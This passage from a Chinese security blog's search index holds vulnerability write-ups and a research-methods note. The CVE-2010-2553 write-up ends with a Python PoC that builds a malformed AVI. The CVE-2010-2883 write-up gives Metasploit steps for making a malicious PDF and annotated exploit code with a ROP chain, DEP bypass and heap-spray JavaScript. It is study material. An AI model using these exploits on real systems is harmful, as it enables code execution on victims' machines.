0x4141        &quot;\\x41\\x41&quot;                # CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141        &quot;\\x41\\x41&quot;                # Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141        &quot;\\x11\\x00&quot;                # Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip        &quot;\\x00\\x10&quot;                # Size of strip data    &quot;Strip Header&quot;                  |   ; Size of strip data = 0x10 = 16        &quot;\\x41\\x00&quot;                # Strips top Y position&lt;----+---------------------------+   ; Strips top Y position = 0x4141        )                     idx_tag =    (        &quot;\\x69\\x64\\x78\\x31&quot;    # dwFourCC = &quot;idx1&quot; &lt;-----------+         &quot;\\x10\\x00\\x00\\x00&quot;    # dwSize = 0x10 = 16 byte       |         &quot;\\x30\\x30\\x64\\x63&quot;        # dwChunkId = &quot;00dc&quot;     &quot;idx1&quot;         &quot;\\x10\\x00\\x00\\x00&quot;        # dwFlags = 0x10            |         &quot;\\x04\\x00\\x00\\x00&quot;        # dwOffset = 0x4            |         &quot;\\x68\\x00\\x00\\x00&quot;        # dwSize = 0x68 &lt;-----------+     )        avifile = open(&#x27;poc3.avi&#x27;, &#x27;wb+&#x27;)    avifile.write(aviHeaders)    avifile.write(padding)    avifile.write(movi_tag)    avifile.write(cinepak_codec_data1)    avifile.write(number_of_coded_strips)    avifile.write(cinepak_codec_data2)    avifile.write(idx_tag)      avifile.close()    print &#x27;[-] AVI file generated&#x27;  if __name__ == &#x27;__main__&#x27;:    main()\n\nEXP 的内容即为把手搓的二进制文件内容塞到 .avi 文件里，参照注释理解即可\n漏洞修复该漏洞的修复在 iccvid.dll 1.10.0.12 -&gt; 1.1.0.0.13 的补丁中。补丁为 Number of coded strips 设置了阈值，其值大于 3 时将会被修改为 3，进而限制了堆内存复制的次数以避免堆溢出的发生\nReferenceNVD - CVE-2010-2553CVE - CVE-2010-2553CVEdetails.com - CVE-2010-2553Github - CVE-2010-2553Microsoft安全公告 MS10-055 - 严重EXPLOIT DATABASE - Microsoft Cinepak Codec CVDecompress - Heap Overflow (MS10-055)漏洞战争Cinepak(CVID) stream format for AVI and QTsp4n9x’s Blog - AVI文件格式分析sp4n9x’s Blog - CVE-2010-2553复现与分析\n","categories":["Vulnerability Investigation"]},{"title":"《研究的艺术》 Ⅲ","url":"/2024/07/24/Research%20Note/%E7%A0%94%E7%A9%B6%E7%9A%84%E8%89%BA%E6%9C%AF-%E2%85%A2/","content":"第三部分 提出观点并加以支持 Making a Claim and Supporting it之前的部分我们深入了探讨了为什么研究的问题是有价值的，为什么以及如何在写作的过程中不断地去问 “so what”。这一个部分，我们将会更关心一个新的问题，”Why should I believe that?”。\n提出好的论证 Making Good Arguments写作是一种假想的对话，使得研究者在与真实的人对话前能够通过详细地陈述论据有效且可信地表达自己的观点。一般而言，每一项被写出来的论证————不管是否与研究有关————都基于作者要为读者回答的五种问题：\n\nClaim——作者的观点是什么\nReasons——什么理由能够支持作者的观点&#x2F;为什么作者能说它的观点是对的\nEvidence——什么论据能够支持作者的理由&#x2F;这些论点有哪些论据\nAcknowledgement and Response——但 … 又如何(But what about … ?)\nWarrant——什么原理能够证明作者的理由和观点之间的关联&#x2F;逻辑关系\n\n研究者需要将观点建立在理由的基础上，将理由建立在论据的基础上，为理由的关联赋予论据，在此期间始终承认与回应其它看法并在它们的基础上从简单的论证构建出复杂的论证，并反映出自己的学术风范(ethos)\n\n论证失败有许多原因，缺乏经验的研究者常因太依赖自己熟悉的领域而忽略读者的需要，因而造成错误。其中有两个常见的问题不恰当的论据 (Inappropriate evidence)不同的领域有着不同的研究哲学与思维模式，并对不同的论据有着不同的标准与看法。例如轶闻趣事增添了文学史的趣味性，但对社会学的解释而言却不见得是好的论据。细腻的叙事在许多人类学报告中是极其重要的，但对于粒子物理学的论证来说却是毫不相关的。不同的领域往往都有着其不同的论据形式，例如：\n\n直接引用他人的话（如大多数的人文学科）\n以前的作者引用的例证（如法学）\n对行为的详细描述（如人类学）\n行为的统计概述（如社会学）\n在实验室中基于实验收集到的数据（如自然科学）\n相片、录音、录像带和影片等（如艺术、音乐、历史和人类学）\n详细的文件资料汇聚成完整且一致性的故事（如历史学）\n有原则、含义、推论及结论交织成的并不依赖实际数据的网络（如哲学）\n\n路径依赖一位研究者在刚接触新领域时总是倾向于找出熟悉的方法或是明确的，有助于简化问题复杂性的解答。但是复杂的问题不会仅是单一又明确的原因，一个严肃的问题不会只有唯一而无限定条件的答案，一个有趣的问题也不会只有一种方法能够解决。研究者学到了一个领域的典型问题及其解决方法、各种学说等后往往会对标准的论证形式感到自在。此时，哪些稍微积累了一些研究经验的研究者容易屈服于另一种过度概括(overgeneralization)之中。一旦它们学会了如何构建一种论证，就会试着一遍又一遍地提出相同的论证而忽略每一个领域都存在着第二种复杂性：相互竞争的解决方案、相互竞争的方法论、相互竞争的目标等的复杂性（中译本在此处的表达方式非常的别扭，简而言之就是说研究者容易呆在自己的研究方法论舒适区中并形成路径依赖或思维定势而忽略其它潜在的影响问题的因素）\n\n另一种理解方式是一位研究者可能会因为过于熟悉一个领域而将那些它认为是正确事实上也确实可能是正确但读者未必知道的论证直接跨过不提，进而给出一个非常简单的答案\n\n\n观点 Making Claims正如前文所强调的，一位研究者在确切地知道自己研究问题的最终答案之前，需要先给出一个暂时性的答案。即使非常显而易见地这个答案将会被其它答案所取代，我们也依旧需要这个暂时性的答案来帮助我们收集相关数据与整理支持论点的论据。为了尽可能地拟出在自己所能了解的范围内最好、最完整的研究观点，研究者可以通过下面三个问题来检验它：\n\n我要提出哪一类的观点？（不同类别的观点需要不同的论据）\n我能具体地陈述它吗？(避免论点过于空洞)\n读者认为它重要吗？（不仅研究的问题需要是有价值的，给出的答案也应该是有价值的）\n\n研究者的论点可能是声明一些什么东西存在或者什么样的事实，可能是声明一些定义或分类，可能是声明一些现象背后的原因或它们导致的后果，可能是对某些对象进行评估，也可能是针对特定问题我们应该采取什么样的方案。对于技术研究领域而言，研究者们所给出的论点大部分都是针对特定问题的解决方案，而这些解决方案最好要符合下面的条件：\n\n它是可行的，而且可以在合理的时间内完成\n执行它的代价比没有解决这个难题的损失更低\n它不会导致比原来更大的难题\n它的性价比更高\n\n无论研究者的论点是什么样的，一个好的论点都应该是具体而重要的。其判断依据和前文我们对研究问题的讨论类似。\n\n一个用于限定确定性的有效方式是模糊限制(hedge)。很少有研究者能问心无愧地给出论点，并表示它提出的论据非常可靠，以至于其观点毋庸置疑。谨慎的作者通过模糊限制的修饰词或修饰语句来承认研究的限定条件，从而尽可能谦逊而审慎地论证自己的论点不过技术类的论文其实不是那么需要 hedge，因为数据就摆在那里，事实就是事实。过多的 hedge language 可能会让读者觉得作者畏畏缩缩，对成果没有自信Hedge 的剂量还是需要依情况而定，最好多阅读论文，看看前辈们往往是怎么做的\n\n理由和论据 Assembling Reasons and Evidence运用理由来规划你的论证 Using Reasons to plan your argument在读者阅读研究者的论点后，会去接着看这一论点被提出的理由，如果理由说得过去，并且这些理由的逻辑关系或者是思路合理，才会接着去看作为理由来源的论据。论据是论证的基石，如果论证不是可信的，读者就没有道理接受作者给出的理由，因而拒绝作者的论点。\n理由可以勾勒出研究者论证的逻辑，而且加入每个主要理由都是一个小节的论点，那么这些理由也会同时勾勒出整篇论文的轮廓。一种非常有效的，被称作为“分镜”（Storyboard）的图标式大纲如下所示：\n主要观点├─ 理由│  ├─ 次要理由│  │  └─论据│  ├─ 次要理由│  │  └─论据│  └─ 次要理由│      └─论据├─ 理由│  └─ ...├─ 理由│  └─ ...├─ 理由│  └─ ...\n\n研究者们可以尝试不同的排序和分组，知道寻获最能反应自己目前理解的安排方式。当然，这样的大纲是树形的，而读者的阅读与论文的写作对内容的遍历却是线性的，研究者需要把树形的大纲转换为线性内容叙述，例如采用深度优先搜索或广度优先搜索等算法去完成转换的工作。\n论据和论据的报告 Distinguishing evidence from reports of it一个棘手的问题是，研究者的报告很少包含实际论据本身。例如当一位检察官在法庭上提供被告人买卖毒品的论据时，可以直接拿出被买卖的毒品本身作为论据，但当这位检察官在法律学报上撰写该案例的文章时，却不能在文章里附上装着作为论据的毒品，而只能提及（refer to）或加以描述（describe）。这些报告应该是尽可能客观的，一般会有下面这些报告方式：\n\n对信件、日记、书等材料的直接引述（direct quotation）\n以逸闻、故事和描写的形式呈现物体、影响和事件\n以图表和文字来呈现量化的数据\n对上述形式加以概述（summarize）或改写（paraphrase）\n\n可靠的论据 Evaluating your evidence一个好的论据应该是：\n\n准确的（accurate）\n精确的（precise）\n足够的（sufficient）\n有代表性的（representative）\n权威的（authoritative）\n\n承认与回应一个研究者必须具备批判性的思维(critical thinking)，并批判性地看待自己与别人的论点与论证。预想读者对论文可能有的提问、建议与反对，加以承认并回应是作者与读者之间建立工作关系（working relationship）最有效的方法。读者针对作者的论证最可能提出两种问题：\n\n质疑内在的完备性：观点的明确都、理由的关联性以及论据的质量\n质疑外部的完备性：替代方案，未曾考虑到&#x2F;缺失的论据\n\n当研究者承认并回应上述两种问题时，它便建构了一项书面论证，仿佛是它在与志趣相投的同事们进行思想交流\nReferenceThe Craft of Research Fourth Edition跟李沐学 AI\n","categories":["Research Note"]},{"title":"CVE-2010-2883 漏洞研究","url":"/2024/07/07/Vulnerability%20Investigation/CVE-2010-2883-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"CVE-2010-2883 是 Adobe Reader 和 Acrobat 中的 CoolType.dll 库在解析字体文件 SING 表中的 uniqueName 项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致任意代码执行。这种”打开 PDF 即刻中招”的效果堪称”简单暴力”的典范，也使其作为漏洞而言非常经典\n影响范围：Adobe Reader 8.2.4 - 9.3.4\n\n\nTTF 结构与 SING 表结构一个 PDF（Portable Document Format）文件在文件结构上主要由四个部分组成\n\nHeader 文件头，用于注明 PDF 文件的版本号，其值为 %PDF-版本号\nBody 文件体，主要有组成文件的对象组成，如图片，文字等\nCross-reference table 交叉引用表，用于存放所有对象的位置偏移，可以方便地访问 PDF 中的任意对象\nTrailer 文件尾，给出了交叉引用表的位置和一些关键对象的信息，以 %%EOF 结尾\n\nPDF Body 可以被视作一个树状的层次结构，其中的每一个结点都是一个对象，由其根节点 Document Catalog 开始，其节点包括了文档的内容（Page Tree），纲要（Outline）等等属性。在 PDF 中会包含字体对象，它的内容是一个 TTF 字体文件\n一个 TTF 文件（The TrueType Font File）由一个表目录与一系列的表组成，表目录 Font Directory 记录了整个文件以及各个表的信息，其记录的每张表目录项的结构如下\ntypedef struct&#123;char tag[4];  # 表标识ULONG checkSum; # 校验和ULONG offset; # 实表偏移ULONG length; # 实表长度&#125; TableEntry;\n\n每一张表都有一个四字节大小的标签，SING（Smart INdependent Glyphlets，智能独立字形包）则是这些标签之一。SING 技术是Adobe公司推出的针对“外字”（Gaiji）的解决方案，外字是日语中的意思，中文中就是生僻字的意思。的意思。SING 允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（glyphlet）。这一规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。SING 表目录项的结构体值往往为\nTableEntry&#123;char tag[4] = &quot;SING&quot;;ULONG checkSum = 0xD9BCC8B5;ULONG offset = 0x0000011c;ULONG length = 0x00001DDF;&#125;\n\n\nTrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。\n\n而一个 SING 表的内容的数据结构则如下所示\n#define FORMAT_SING_H#define SING_VERSION VERSION(1, 1)#define SING_UNIQUENAMELEN 28#define SING_MD5LEN 16typedef struct&#123;Card16 tableVersionMajor; // Card16 即 USHORTCard16 tableVersionMinor;Card16 glyphletVersion;Card16 permissions;Card16 mainGID;Card16 unitsPerEm;Int16 vertAdvance;Int16 vertOrigin;Card8 uniqueName[SING_UNIQUENAMELEN]; // Card8 即 BYTECard8 METAMD5[SING_MD5LEN];Card8 nameLength;Card8 *baseGlyphName;&#125; SINGTbl;\n\n其中 uniqueName 字段需要记住，因为这与该漏洞的利用密切相关\n漏洞分析使用 IDA 打开 CoolType.dll 库，从漏洞描述可知漏洞代码引用了 SING 字符串，这意味着攻击者可以直接采用基于字符串定位的分析方法，即搜索 “SING” 字符串并查看交叉引用，便能够定位到这段代码\n.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ....rdata:0819DB51                 align 4....text:0803DCF9     push    ebp                            ; 父函数ebp.text:0803DCFA     sub     esp, 104h                      ; 分配栈空间0x104.text:0803DD00     lea     ebp, [esp-4] ; esp-4 赋给 ebp ,而不是 esp-4 处的值赋给 ebp ,后面 strcat 会把执行结果保存在以 ebp 为起始地址的栈空间中.text:0803DD04     mov     eax, ___security_cookie ; security_cookie-&gt;eax.text:0803DD09     xor     eax, ebp                ; security_cookie^ebp-&gt;eax.text:0803DD0B     mov     [ebp+108h+var_4], eax   ; 将和ebp异或完的 security_cookie 存到栈上父函数 ebp 之前的 4 字节中.text:0803DD11     push    4Ch                     ; __EH_prolog3_catch 函数中分配栈空间的大小.text:0803DD13     mov     eax, offset loc_8184A54 ; 调用 __security_check_cookie 函数的代码段起始地址.text:0803DD18     call    __EH_prolog3_catch      ; 向栈上写入 SEH 结构.text:0803DD1D     mov     eax, [ebp+108h+arg_C].text:0803DD23     mov     edi, [ebp+108h+arg_0].text:0803DD29     mov     ebx, [ebp+108h+arg_4].text:0803DD2F     mov     [ebp+108h+var_130], edi.text:0803DD32     mov     [ebp+108h+var_138], eax.text:0803DD35     call    sub_804172C.text:0803DD3A     xor     esi, esi.text:0803DD3C     cmp     dword ptr [edi+8], 3.text:0803DD40     mov     [ebp+108h+var_10C], esi.text:0803DD43     jz      loc_803DF00.text:0803DD49     mov     [ebp+108h+var_124], esi.text:0803DD4C     mov     [ebp+108h+var_120], esi.text:0803DD4F     cmp     dword ptr [edi+0Ch], 1.text:0803DD53     mov     byte ptr [ebp+108h+var_10C], 1.text:0803DD57     jnz     loc_803DEA9.text:0803DD5D     push    offset aName    ; &quot;name&quot;.text:0803DD62     push    edi             ; int.text:0803DD63     lea     ecx, [ebp+108h+var_124].text:0803DD66     mov     [ebp+108h+var_119], 0.text:0803DD6A     call    sub_80217D7.text:0803DD6F     cmp     [ebp+108h+var_124], esi.text:0803DD72     jnz     short loc_803DDDD.text:0803DD74     push    offset aSing            ; &quot;SING&quot;.text:0803DD79     push    edi                     ; 类对象指针(0x0012E718),第一个变量为 dword_823A850 加 1 之前的值。.text:0803DD7A     lea     ecx, [ebp+108h+var_12C] ; ecx为字体对象,thiscall,ecx 传参.text:0803DD7D     call    sub_8021B06             ; 解析字体对象,处理 SING 表.text:0803DD82     mov     eax, [ebp+108h+var_12C] ; eax 指向 SING 表数据.text:0803DD85     cmp     eax, esi                ; 判断是否为空.text:0803DD87     mov     byte ptr [ebp+108h+var_10C], 2.text:0803DD8B     jz      short loc_803DDC4       ; 这里不跳转.text:0803DD8D     mov     ecx, [eax]              ; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到 strcat.text:0803DD8F     and     ecx, 0FFFFh.text:0803DD95     jz      short loc_803DD9F       ; 这里跳转.text:0803DD97     cmp     ecx, 100h.text:0803DD9D     jnz     short loc_803DDC0.text:0803DD9F.text:0803DD9F loc_803DD9F:                ; CODE XREF: sub_803DCF9+9C↑j.text:0803DD9F     add     eax, 10h                       ; 相对 SING 表入口偏移 0x10 处找到 uniqueName.text:0803DDA2     push    eax                            ; char *,strcat 源地址入栈，也就是 uniqueName 起始地址.text:0803DDA3     lea     eax, [ebp+108h+uniqueName_buf] ; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址.text:0803DDA6     push    eax                            ; char *,strcat 目的地址入栈.text:0803DDA7     mov     [ebp+108h+uniqueName_buf], 0   ; 将目标字符串赋值为NULL,空字符串.text:0803DDAB     call    strcat                         ; 危险函数 strcat,罪魁祸首\n\n反编译后得到\nsub_80217D7(v20,a1,&quot;name&quot;);if ( v20[0] )    goto LABEL_12;sub_8021B06(v18,a1,&quot;SING&quot;);v6 = v18;LOBYTE(v22) = 2;if ( v18 )&#123;    if !(unsigned __int16)*(_DWORD *)v18 || (unsigned __int16)*(_DWORD *)v18 == 256    &#123;        Destination[0] = 0;        strcat(Destination, (const char *)(v18 + 0x10));        sub_8001243(Destination);        v6 = v18;    &#125;    v21 = 1;&#125;\n\n它首先会读取 SING 表，之后将 SING 表中 0x10 偏移处(即 UniqueName 字段)通过调用 strcat 函数直接拼接到 Destination 中，而 strcat 函数会将参数 src 字符串复制到参数 dest 所指的字符串尾部，src 字符串的拷贝从第一个字符开始，直到遇到 “\\x00” 时结束。这一函数调用过程没有检验拼接的字符串的长度，即未考虑拼接后的字符串超度是否会超出 dest 字符串长度，故存在栈溢出漏洞，攻击者可通过在 TTF 文件的 SING 表的 uniqueName 字段处（0x10 偏移位置）填入任意长度的字符串实施栈溢出攻击\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2010-2883\n\n搜索结果\nMatching Modules================   #  Name                                            Disclosure Date  Rank   Check  Description   -  ----                                            ---------------  ----   -----  -----------   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer OverflowInteract with a module by name or index. For example info 1, use 1 or use exploit/windows/fileformat/adobe_cooltype_sing\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/fileformat/adobe_cooltype_singmsf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; info\n\n模块详情信息\n       Name: Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow     Module: exploit/windows/fileformat/adobe_cooltype_sing   Platform: Windows       Arch: Privileged: No    License: Metasploit Framework License (BSD)       Rank: Great  Disclosed: 2010-09-07Provided by:  Unknown  sn0wfl0w  jduck &lt;jduck@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   AutomaticCheck supported:  NoBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  FILENAME  msf.pdf          yes       The file name.Payload information:  Space: 1000  Avoid: 1 charactersDescription:  This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table  handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are  assumed to be vulnerable as well.References:  https://nvd.nist.gov/vuln/detail/CVE-2010-2883  OSVDB (67849)  http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html  http://www.adobe.com/support/security/advisories/apsa10-02.htmlView the full module info with the info -d command.\n\n使用该模块生成木马 PDF 文件\nmsf6  exploit(adobe_cooltype_sing) &gt; set FILENAME Crash.pdfmsf6  exploit(adobe_cooltype_sing) &gt; set payload windows/execmsf6  exploit(adobe_cooltype_sing) &gt; set CMD calc.exemsf6  exploit(adobe_cooltype_sing) &gt; exploit\n\nExploit 分析Exploit 代码概览该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb\n\n让我们来看看这个 exp 是如何进行漏洞利用的\nrequire &#x27;msf/core&#x27;require &#x27;zlib&#x27;class Metasploit3 &lt; Msf::Exploit::Remote    Rank = GreatRanking # aslr+dep bypass, js heap spray, rop, stack bof    include Msf::Exploit::FILEFORMAT    #* 初始化函数，注明了 exp 的模块信息    def initialize(info = &#123;&#125;)        super(update_info(info,            &#x27;Name&#x27;           =&gt; &#x27;Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow&#x27;,            &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,            &#x27;License&#x27;        =&gt; MSF_LICENSE,            &#x27;Author&#x27;         =&gt; ...,            &#x27;Version&#x27;        =&gt; &#x27;$Revision: 10477 $&#x27;,            &#x27;References&#x27;     =&gt; ...,            &#x27;DefaultOptions&#x27; =&gt; ...,            &#x27;Payload&#x27;        =&gt; ...,            &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,            &#x27;Targets&#x27;        =&gt; ...,            &#x27;DisclosureDate&#x27; =&gt; &#x27;Sep 07 2010&#x27;,            &#x27;DefaultTarget&#x27;  =&gt; 0)        )        register_options(...)    end    #* 漏洞利用的入口函数    def exploit        ttf_data = make_ttf()        js_data = make_js(payload.encoded)        pdf = make_pdf(ttf_data, js_data)        print_status(&quot;Creating &#x27;#&#123;datastore[&#x27;FILENAME&#x27;]&#125;&#x27; file...&quot;)        file_create(pdf)    end    #* 构造 TTF 文件    def make_ttf        ...    end    #* 构造 JS 文件    def make_js        ...    end    #* 随机生成指定长度非 ASCII 码字符序列    def RandomNonASCIIString(count)        ...    end    #* 为木马 PDF 文件生成对象定义的起始部分    def ioDef(id)        ...    end    #* 为木马 PDF 文件生成对象引用    def ioRef(id)        ...    end    #* 随机替换大写字母为 16 进制表示以混淆字符串    #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/    def nObfu(str)        ...    end    #* 将字符串编码为 16 进制并用随机数量的空格分隔    def ASCIIHexWhitespaceEncode(str)        ...    end    #* 生成木马 PDF 文件    def make_pdf(ttf, js)        ...    end\n\n通过审计 exploit 函数，我们能够很快地理解这个 exp 工作的大体流程是生成恶意的 ttf 与 js 文件，把它们封装到木马 pdf 文件中并导出 pdf  到本地。忽略制作 pdf 文件与增加 payload 随机性进行混淆的相关函数，exp 进行漏洞利用的核心代码显然位于 make_ttf 与 make_js 两个函数中。由于栈溢出是由 ttf 文件中的中的 payload 触发的，因此我们先从 make_ttf 函数开始审计\nmake_ttf 函数def make_ttf    ttf_data = &quot;&quot;    # load the static ttf file    #* Exp 使用的基础文件即下方原注释所标注的 ttf 文件，exp 只需要对基础文件进行修改注入 payload 即可    # NOTE: The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)    path = File.join( Msf::Config.install_root, &quot;data&quot;, &quot;exploits&quot;, &quot;cve-2010-2883.ttf&quot; )    fd = File.open( path, &quot;rb&quot; )    ttf_data = fd.read(fd.stat.size)    fd.close    # Build the SING table    #* 初始化 sing 字符串    sing = &#x27;&#x27;    #* 生成 SING 表 uniqueName 字段前的八个字段的值    sing &lt;&lt; [        0, 1,   # tableVersionMajor, tableVersionMinor (0.1)        0xe01,  # glyphletVersion        0x100,  # embeddingInfo        0,      # mainGID        0,      # unitsPerEm        0,      # vertAdvance        0x3a00  # vertOrigin    ].pack(&#x27;vvvvvvvv&#x27;)    # uniqueName    # &quot;The uniqueName string must be a string of at most 27 7-bit ASCII characters&quot;    #* 生成长度为 0x254 - sing 字符串长度的随机字符串用于增加 payload 随机性    #* 为方便动态分析时定位 payload 可改为    #* sing &lt;&lt; &quot;A&quot; * (0x254 - sing.length)    sing &lt;&lt; rand_text(0x254 - sing.length)    # 0xffffffff gets written here @ 0x7001400 (in BIB.dll)    sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack(&#x27;V&#x27;)    # This becomes our new EIP (puts esp to stack buffer)    ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret    sing[0x208, 4] = [ret].pack(&#x27;V&#x27;)    # This becomes the new eip after the first return    ret = 0x4a82a714    sing[0x18, 4] = [ret].pack(&#x27;V&#x27;)    # This becomes the new esp after the first return    esp = 0x0c0c0c0c    sing[0x1c, 4] = [esp].pack(&#x27;V&#x27;)    # Without the following, sub_801ba57 returns 0.    sing[0x24c, 4] = [0x6c].pack(&#x27;V&#x27;)    #* 将 payload 插入到基础文件的指定位置    ttf_data[0xec, 4] = &quot;SING&quot;    ttf_data[0x11c, sing.length] = sing    ttf_dataend\n\n查看基础文件的 0xec 与 0x11c 处，发现这两处其实是基础文件的 name 表。make_ttf 函数的实际工作流程就是把基础文件的 NAME 表 tag 改为了 SING，并用包含了 Payload 的 sing 字符串的内容替换了基础文件的 NAME 表内容。查看导出的 TTF 文件能够发现该文件中不存在 NAME 表，与上述结论相符合。接下来让我们仔细审计 uniqueName 字段中填入的 payload\n# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack(&#x27;V&#x27;)#* 第一个 ROP Gadget 位于 icucnv36.dll 中的 0x4A80CB38 处#* gadget 内容是#* add ebp, 0x794 ;此时 ebp 的值会被调整到 strcat 函数调用后的栈区#* leave#* ret ; 执行第二条 gadget# This becomes our new EIP (puts esp to stack buffer)ret = 0x4a80cb38 # add ebp, 0x794 / leave / retsing[0x208, 4] = [ret].pack(&#x27;V&#x27;)#* 第二个 ROP Gadget 位于 icucnv36.dll 中的 0x4A82A714 处#* gadget 内容为#* pop esp ; 使下方 ruby 代码填入的值成为 esp#* ret# This becomes the new eip after the first returnret = 0x4a82a714sing[0x18, 4] = [ret].pack(&#x27;V&#x27;)# This becomes the new esp after the first returnesp = 0x0c0c0c0csing[0x1c, 4] = [esp].pack(&#x27;V&#x27;)#* 参考链接 2010.09.09 - VUPEN 的文章给出了这个数据的作用# Without the following, sub_801ba57 returns 0.sing[0x24c, 4] = [0x6c].pack(&#x27;V&#x27;)\n\n以上代码设置了一条 ROP 链，用于劫持执行流到 Heap Spray 的用于绕过 DEP 的 payload 处，如下图所示（图来自 Sp4n9x 的博客）\n\n\n其中的 ROP Gadget 选择了 icucnv36.dll 中的指令，选择这两处地址中的指令的原因在于，如果打开 icucnv36.dll，会发现其 IMAGE_OPTIONAL_HEADER 中的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 的值为 0，也就是说这个 dll 库没有开启 ASLR。事实上，在 Adobe Reader 的各个版本上，这个库应该都基于 Adobe 的某种需要而始终没有开启 ASLR。这使得该 exp 对受影响的各版本 Adobe Reader 都能够稳定且兼容地进行漏洞利用\n\nmake_js 函数既然 ttf 文件中的 payload 是用来跳转到真正的执行 shellcode 的 payload 上的，后者存在的位置也就只能是在 make_js 函数里了。事实上，在审计 exploit ruby 代码时就能够非常容易发现 make_js 函数里存放的大量 payload。接下来审计 make_js 函数\n    def make_js(encoded_payload)        #* stack_data 字符串存放了利用 shellcode 所需的 payload        # The following executes a ret2lib using icucnv36.dll        # The effect is to bypass DEP and execute the shellcode in an indirect way        #* stack_data 内容较长下文再审计，此处用 ... 略过        stack_data = [            ...        ].pack(&#x27;V*&#x27;)        var_unescape  = rand_text_alpha(rand(100) + 1)        var_shellcode = rand_text_alpha(rand(100) + 1)        var_start     = rand_text_alpha(rand(100) + 1)        var_s         = 0x10000        var_c         = rand_text_alpha(rand(100) + 1)        var_b         = rand_text_alpha(rand(100) + 1)        var_d         = rand_text_alpha(rand(100) + 1)        var_3         = rand_text_alpha(rand(100) + 1)        var_i         = rand_text_alpha(rand(100) + 1)        var_4         = rand_text_alpha(rand(100) + 1)        payload_buf = &#x27;&#x27;        payload_buf &lt;&lt; stack_data        #* 可以发现 shellcode 紧跟在 stack_data 后        payload_buf &lt;&lt; encoded_payload        escaped_payload = Rex::Text.to_unescape(payload_buf)        js = %Q|var #&#123;var_unescape&#125; = unescape;var #&#123;var_shellcode&#125; = #&#123;var_unescape&#125;( &#x27;#&#123;escaped_payload&#125;&#x27; );var #&#123;var_c&#125; = #&#123;var_unescape&#125;( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );while (#&#123;var_c&#125;.length + 20 + 8 &lt; #&#123;var_s&#125;) #&#123;var_c&#125;+=#&#123;var_c&#125;;#&#123;var_b&#125; = #&#123;var_c&#125;.substring(0, (0x0c0c-0x24)/2);#&#123;var_b&#125; += #&#123;var_shellcode&#125;;#&#123;var_b&#125; += #&#123;var_c&#125;;#&#123;var_d&#125; = #&#123;var_b&#125;.substring(0, #&#123;var_s&#125;/2);while(#&#123;var_d&#125;.length &lt; 0x80000) #&#123;var_d&#125; += #&#123;var_d&#125;;#&#123;var_3&#125; = #&#123;var_d&#125;.substring(0, 0x80000 - (0x1020-0x08) / 2);var #&#123;var_4&#125; = new Array();for (#&#123;var_i&#125;=0;#&#123;var_i&#125;&lt;0x1f0;#&#123;var_i&#125;++) #&#123;var_4&#125;[#&#123;var_i&#125;]=#&#123;var_3&#125;+&quot;s&quot;;|        js    end\n\nmake_js 需要接受一段加密后的 shellcode 作为参数，这段 shellcode 将会经过 make_js 函数的处理后被执行。可以发现 exp 在讲 shellcode 存入 payload_buf 前，先向 payload_buf 中存入了 stack_data 内的 payload，对其进行审计\n0x41414141,   # unused 用于补齐堆块内容长度占用的 4B0x4a8063a5,   # pop ecx / ret0x4a8a0000,   # becomes ecx0x4a802196,   # mov [ecx],eax / ret # save whatever eax starts as0x4a801f90,   # pop eax / ret0x4a84903c,   # becomes eax (import for CreateFileA)# -- call CreateFileA0x4a80b692,   # jmp [eax]0x4a801064,   # ret0x4a8522c8,   # first arg to CreateFileA (lpFileName / pointer to &quot;iso88591&quot;)0x10000000,   # second arg  - dwDesiredAccess0x00000000,   # third arg   - dwShareMode0x00000000,   # fourth arg  - lpSecurityAttributes0x00000002,   # fifth arg   - dwCreationDisposition0x00000102,   # sixth arg   - dwFlagsAndAttributes0x00000000,   # seventh arg - hTemplateFile0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx0x4a842db2,   # xchg eax,edi / ret0x4a802ab1,   # pop ebx / ret0x00000008,   # becomes ebx - offset to modify## This points at a neat-o block of code that ... TBD##   and 